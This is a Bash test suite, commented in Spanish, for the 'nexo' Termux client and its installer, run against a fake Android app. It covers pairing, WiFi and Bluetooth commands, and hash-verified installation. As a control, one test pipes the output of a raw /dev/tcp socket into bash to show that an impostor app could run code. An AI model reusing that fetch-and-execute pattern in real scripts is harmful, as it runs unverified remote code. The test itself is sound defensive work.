#!/usr/bin/env bash
# Pruebas del cliente «nexo» y del instalador contra una app Nexo FALSA (tests/fake_app.py).
# No hace falta móvil. Necesita: bash, python3, jq.    Uso:  bash tests/run_tests.sh
set -u

ROOT=$(cd "$(dirname "$0")/.." && pwd)
NEXO=$ROOT/termux/bin/nexo
T=$(mktemp -d)
PASS=0
FAIL=0

cleanup() {
    pkill -f "$ROOT/termux/bin/nexo watch" 2>/dev/null
    pkill -f "$ROOT/tests/fake_app.py" 2>/dev/null
    rm -rf "$T"
}
trap cleanup EXIT

ok()  { PASS=$((PASS + 1)); printf '  ok    %s\n' "$1"; }
bad() { FAIL=$((FAIL + 1)); printf '  FALLA %s\n' "$1"; [ -n "${2:-}" ] && printf '        %s\n' "$2"; return 0; }
run() { OUT=$("$@" 2>"$T/err"); RC=$?; ERR=$(cat "$T/err"); }
rc_is() { if [ "$RC" -eq "$2" ]; then ok "$1"; else bad "$1" "código $RC (se esperaba $2). out=[$OUT] err=[$ERR]"; fi; }
has()   { case "$OUT$ERR" in *"$2"*) ok "$1" ;; *) bad "$1" "no aparece «$2». out=[$OUT] err=[$ERR]" ;; esac; }
hasnt() { case "$OUT$ERR" in *"$2"*) bad "$1" "aparece «$2» y no debería" ;; *) ok "$1" ;; esac; }
eq()    { if [ "$OUT" = "$2" ]; then ok "$1"; else bad "$1" "se esperaba [$2] y salió [$OUT] err=[$ERR]"; fi; }
jqok()  { if printf '%s' "$OUT" | jq -e "$2" >/dev/null 2>&1; then ok "$1"; else bad "$1" "jq «$2» falló sobre [$OUT]"; fi; }
waitfor() { local i; for i in $(seq $(($3 * 10))); do grep -qF -- "$2" "$1" 2>/dev/null && return 0; sleep 0.1; done; return 1; }

for need in python3 jq; do
    command -v "$need" >/dev/null 2>&1 || { echo "Falta $need para correr las pruebas"; exit 2; }
done

echo "== Sintaxis"
for f in "$NEXO" "$ROOT/termux/install.sh" "$ROOT/tests/run_tests.sh"; do
    if bash -n "$f" 2>"$T/err"; then ok "bash -n $(basename "$f")"; else bad "bash -n $(basename "$f")" "$(cat "$T/err")"; fi
done
if python3 -m py_compile "$ROOT/tests/fake_app.py" 2>"$T/err"; then ok "py_compile fake_app.py"; else bad "py_compile fake_app.py" "$(cat "$T/err")"; fi
if command -v shellcheck >/dev/null 2>&1; then
    if shellcheck -S error "$NEXO" "$ROOT/termux/install.sh" >"$T/sc" 2>&1; then ok "shellcheck (solo errores)"; else bad "shellcheck" "$(head -20 "$T/sc")"; fi
fi

# ---------------------------------------------------------------- app falsa
TOKEN=$(printf 'a1b2c3d4%.0s' 1 2 3 4 5 6)
python3 "$ROOT/tests/fake_app.py" --token "$TOKEN" --portfile "$T/port" --record "$T/rec" >/dev/null 2>&1 &
for _ in $(seq 50); do [ -s "$T/port" ] && break; sleep 0.1; done
PORT=$(cat "$T/port" 2>/dev/null)
[ -n "$PORT" ] || { echo "No arrancó la app falsa"; exit 1; }

export HOME=$T/home
mkdir -p "$HOME"
unset XDG_CONFIG_HOME PREFIX NEXO_TOKEN NEXO_CONFIG NEXO_TRANSPORT NEXO_NO_JQ
export NEXO_PORT=$PORT

echo "== Enlace y token"
run "$NEXO" wifi status;                 rc_is "sin token falla con código 11" 11
has "…y explica cómo enlazar" "nexo pair"
run "$NEXO" pair "$(printf 'ff%.0s' $(seq 24))"; rc_is "un token equivocado se rechaza (11)" 11
[ ! -e "$HOME/.config/nexo/config" ] && ok "no guarda un token rechazado" || bad "no guarda un token rechazado"
run "$NEXO" pair "$TOKEN";               rc_is "pair con el token bueno" 0
has "…y confirma que la app responde" "todo listo"
[ "$(stat -c %a "$HOME/.config/nexo/config")" = 600 ] && ok "la configuración queda con modo 600" || bad "modo de la configuración"
run "$NEXO" doctor;                      rc_is "doctor" 0
has "doctor ve el enlace" "enlace     OK"

echo "== WiFi"
run "$NEXO" wifi status;                 has "wifi status (texto)" "WiFi: conectado a MiCasa · -55 dBm · 5GHz · 192.168.1.23"
run "$NEXO" wifi status --json;          jqok "wifi status --json" '.enabled == true and .ssid == "MiCasa"'
run "$NEXO" wifi status --short;         eq "wifi status --short" "MiCasa"
run "$NEXO" wifi status --waybar;        jqok "wifi status --waybar" '.class == "connected" and .percentage == 75'
run "$NEXO" wifi status --env
( eval "$OUT"; [ "$NEXO_WIFI_SSID" = MiCasa ] && [ "$NEXO_WIFI_ENABLED" = 1 ] && [ "$NEXO_WIFI_RSSI" = -55 ] ) && ok "wifi status --env (eval)" || bad "wifi status --env" "$OUT"
run "$NEXO" wifi off;                    has "wifi off" "WiFi: apagado"
run "$NEXO" wifi status --short;         eq "tras apagar: --short" "apagado"
run "$NEXO" wifi on;                     has "wifi on" "conectado a MiCasa"
run "$NEXO" wifi scan;                   has "wifi scan: nombre con comillas y acentos" 'Café "Luz"'
has "wifi scan: la / no sale escapada" "Wi-Fi/Invitados"
SSID_RARO='Red "rara" \ con ñ'
PASS_RARA=$'clave con "comillas", \\ y\nsalto de línea'
run "$NEXO" wifi connect "$SSID_RARO" "$PASS_RARA"; rc_is "wifi connect con caracteres raros" 0
LAST=$(tail -n 1 "$T/rec")
if printf '%s' "$LAST" | jq -e --arg s "$SSID_RARO" --arg p "$PASS_RARA" '.ssid == $s and .password == $p' >/dev/null; then
    ok "…la app recibe SSID y clave exactos"
else
    bad "SSID/clave exactos" "$LAST"
fi
printf 'secreta\n' | "$NEXO" wifi connect Casa2 --pass-stdin >/dev/null 2>&1
[ "$(tail -n 1 "$T/rec" | jq -r .password)" = secreta ] && ok "wifi connect --pass-stdin" || bad "wifi connect --pass-stdin"
run "$NEXO" wifi connect Mala;           rc_is "conexión no confirmada → código 3" 3
run "$NEXO" wifi connect MiCasa clave12345; rc_is "wifi connect normal (y vuelve a MiCasa)" 0
has "…y lo confirma" "WiFi: conectado a MiCasa"

echo "== Bluetooth"
run "$NEXO" bt status;                   has "bt status" "Bluetooth: encendido · con dispositivos conectados · 2 emparejados"
run "$NEXO" bt paired;                   has "bt paired: nombre con ñ" "Auriculares ñandú"
has "bt paired: dispositivo sin nombre" "(sin nombre)"
run "$NEXO" bt connect AA:BB:CC:DD:EE:01; rc_is "bt connect → hace falta un toque (3)" 3
has "…y dice por qué" "Android no permite"
run "$NEXO" bt off;                      has "bt off" "Bluetooth: apagado"
run "$NEXO" bt on;                       has "bt on" "encendido"
run "$NEXO" status;                      has "status junta WiFi y Bluetooth" "Bluetooth: encendido"
run "$NEXO" status --json;               jqok "status --json" '.wifi.enabled and .bt.enabled'
run "$NEXO" status --short;              eq "status --short" "MiCasa · conectado"
run "$NEXO" raw '{"cmd":"nope"}';        has "raw: comando desconocido" "unknown_command"

echo "== Transportes y sin jq"
NEXO_TRANSPORT=python run "$NEXO" wifi status --short; eq "transporte python3" "MiCasa"
NEXO_NO_JQ=1 run "$NEXO" wifi status;    has "sin jq: JSON crudo" '"ssid":"MiCasa"'
has "sin jq: avisa" "instala jq"

echo "== Eventos en vivo (watch)"
"$NEXO" watch --pretty >"$T/watch.out" 2>&1 &
waitfor "$T/watch.out" "wifi  → conectado a MiCasa" 5 && ok "watch: llega el estado inicial" || bad "watch: estado inicial" "$(cat "$T/watch.out")"
"$NEXO" wifi off >/dev/null 2>&1
waitfor "$T/watch.out" "wifi  → apagado" 5 && ok "watch: llega el cambio al apagar" || bad "watch: cambio" "$(cat "$T/watch.out")"
"$NEXO" wifi on >/dev/null 2>&1
pkill -f "$ROOT/termux/bin/nexo watch" 2>/dev/null

echo "== Errores de conexión"
NEXO_PORT=1 run "$NEXO" ping;            rc_is "sin nadie escuchando → 10" 10
NEXO_TOKEN=00ff run "$NEXO" ping;        rc_is "token equivocado en el entorno → 11" 11

echo "== Instalación con el comando de una línea (Termux con OTRO nombre de paquete)"
SHA=$(python3 "$ROOT/tests/fake_app.py" --print-bundle-sha)
ONE=$(cat "$ROOT/termux/oneliner.tpl")
mk_one() { local s=$ONE; s=${s//@PORT@/$1}; s=${s//@SHA256@/$2}; s=${s//@TOKEN@/$3}; printf '%s' "$s"; }
mkfork() { local p=$T/$1/data/data/org.otro.termux/files/usr; mkdir -p "$p/bin" "$T/$1/home" "$T/$1/tmp"; printf '%s' "$p"; }
fenv() { local d=$1; shift; env -i PATH="$PATH" HOME="$T/$d/home" PREFIX="$T/$d/data/data/org.otro.termux/files/usr" TMPDIR="$T/$d/tmp" "$@"; }

FP=$(mkfork a)
run fenv a bash -c "$(mk_one "$PORT" "$SHA" "$TOKEN")"
has "instala el cliente" "Cliente instalado en $FP/bin/nexo"
has "enlaza con la app" "La app responde"
[ -x "$FP/bin/nexo" ] && ok "el cliente queda ejecutable en \$PREFIX/bin" || bad "cliente ejecutable"
[ "$(stat -c %a "$T/a/home/.config/nexo/config")" = 600 ] && ok "config con modo 600 en \$HOME/.config/nexo" || bad "config de la instalación"
run fenv a "$FP/bin/nexo" wifi status --short; eq "el cliente instalado funciona sin variables de entorno" "MiCasa"
cmp -s "$FP/bin/nexo" "$NEXO" && ok "el cliente instalado es idéntico al del repositorio" || bad "cliente instalado distinto"

FP2=$(mkfork b)
run fenv b bash -c "$(mk_one "$PORT" "$(printf '0%.0s' $(seq 64))" "$TOKEN")"
[ ! -e "$FP2/bin/nexo" ] && ok "con un hash que no coincide NO se instala nada" || bad "hash incorrecto instaló algo"
has "…y avisa" "no se pudo instalar"

python3 "$ROOT/tests/fake_app.py" --evil --portfile "$T/eport" >/dev/null 2>&1 &
for _ in $(seq 50); do [ -s "$T/eport" ] && break; sleep 0.1; done
EPORT=$(cat "$T/eport")
env NEXO_EVIL_MARK="$T/PWNED1" bash -c "exec 3<>/dev/tcp/127.0.0.1/$EPORT; echo '{\"cmd\":\"bootstrap\"}' >&3; cat <&3 | bash" >/dev/null 2>&1
[ -e "$T/PWNED1" ] && ok "(control) sin comprobar el hash, la app impostora SÍ ejecutaría código" || bad "control de la app impostora"
FP3=$(mkfork c)
run fenv c env NEXO_EVIL_MARK="$T/PWNED2" bash -c "$(mk_one "$EPORT" "$SHA" "$TOKEN")"
[ ! -e "$T/PWNED2" ] && ok "con el comando de la app, el script impostor NO se ejecuta" || bad "se ejecutó el script impostor"
[ ! -e "$FP3/bin/nexo" ] && ok "…y no se instala nada" || bad "se instaló algo desde la app impostora"

echo "== setup-guests (distros de proot-distro)"
G=$FP/var/lib/proot-distro/installed-rootfs
mkdir -p "$G/debian/usr/bin" "$G/alpine/bin"
: > "$G/debian/usr/bin/bash"; chmod +x "$G/debian/usr/bin/bash"
sed -i '1s|.*|#!/data/data/org.otro.termux/files/usr/bin/bash|' "$FP/bin/nexo"   # como si termux-fix-shebang lo hubiera tocado
run fenv a bash "$FP/bin/nexo" setup-guests
has "copia a debian" "✔ debian"
has "copia a alpine" "✔ alpine"
has "avisa de que a alpine le falta bash" "a alpine le falta bash"
hasnt "no avisa de bash en debian" "a debian le falta bash"
[ "$(head -n 1 "$G/debian/usr/local/bin/nexo")" = '#!/usr/bin/env bash' ] && ok "el shebang dentro de la distro es el normal" || bad "shebang en la distro"
[ "$(stat -c %a "$G/debian/etc/nexo/config")" = 644 ] && ok "la config de la distro la leen todos sus usuarios (644)" || bad "modo de config en la distro"
mkdir -p "$T/d/home"
run env -i PATH="$PATH" HOME="$T/d/home" NEXO_CONFIG="$G/debian/etc/nexo/config" "$G/debian/usr/local/bin/nexo" wifi status --short
eq "el cliente copiado a la distro funciona" "MiCasa"

echo "== Desinstalar"
run fenv a bash "$ROOT/termux/install.sh" --uninstall
[ ! -e "$FP/bin/nexo" ] && [ ! -e "$T/a/home/.config/nexo/config" ] && ok "--uninstall quita cliente y enlace" || bad "--uninstall"

echo
echo "Resultado: $PASS bien, $FAIL con fallos"
[ "$FAIL" -eq 0 ]
